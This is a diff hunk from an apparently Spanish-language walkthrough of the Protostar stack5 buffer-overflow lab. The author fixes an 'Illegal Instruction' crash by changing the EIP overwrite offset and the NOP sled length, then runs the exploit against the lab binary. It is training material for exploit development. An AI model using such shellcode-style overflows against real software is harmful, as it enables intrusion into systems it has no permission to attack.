@@ -313,7 +313,7 @@ Illegal Instruction
 Me salía eso y me acabe rallando, pero la solución era muy tonta, aumentar el salto del eip y los nops
 ```python
 eip = struct.pack('I', 0xbffff6ac+20)
-nops = "\x90" *80
+nops = "\x90" *50
 ```
 ```console
 [user@protostar]-[/opt/protostar/bin]:$ (python /tmp/exploit.py; cat) | ./stack5
